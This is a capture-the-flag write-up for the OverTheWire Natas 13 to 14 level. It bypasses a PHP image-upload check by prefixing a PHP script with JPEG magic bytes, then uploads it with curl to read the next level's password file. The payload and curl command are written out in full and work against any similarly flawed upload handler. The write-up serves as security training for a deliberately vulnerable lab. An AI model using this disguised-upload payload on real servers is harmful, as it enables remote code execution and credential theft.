# Natas 13 -> 14

```
http://natas13.natas.labs.overthewire.org
```

```
Username: natas13
```

The same form of the previous level. Except this time they only accept images :-)

```php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } 
```

Well this time they use `if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {`.  
From the PHP.net documentation:  
```
exif_imagetype() reads the first bytes of an image and checks its signature.

exif_imagetype() can be used to avoid calls to other exif functions with unsupported file types or in conjunction with $_SERVER['HTTP_ACCEPT'] to check whether or not the viewer is able to see a specific image in the browser. 

When a correct signature is found, the appropriate constant value will be returned otherwise the return value is FALSE. The return value is the same value that getimagesize() returns in index 2 but exif_imagetype() is much faster.

Note:
exif_imagetype() will emit an E_NOTICE and return FALSE if it is unable to read enough bytes from the file to determine the image type.
```

So `exif_imagetype` reads the first bytes, so let's google for "JPEG Header" and disguise our script.

```bash
$ echo -ne "\xff\xd8\xff\xe1\n<?var_dump(file_get_contents('/etc/natas_webpass/natas14'));" > /tmp/natas13.php
```

Let's try uplading *again* a PHP with, this time with `curl`

```bash
$ curl --user natas13:${NATAS13_PASSWD} --form uploadedfile=@/tmp/natas13.php --form MAX_FILE_SIZE=1000 --form filename=bjjgz1rvxd.php http://natas13.natas.labs.overthewire.org/index.php
```

Aaand

```
For security reasons, we now only accept image files!<br/><br/>

The file <a href="upload/bjjgz1rvxdf32fdqw.php">upload/bjjgz1rvxdf32fdqw.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

ÿØÿá !


* php
* file_get_contents
* var_dump
* exif_imagetype
* curl
* https://en.wikipedia.org/wiki/JPEG
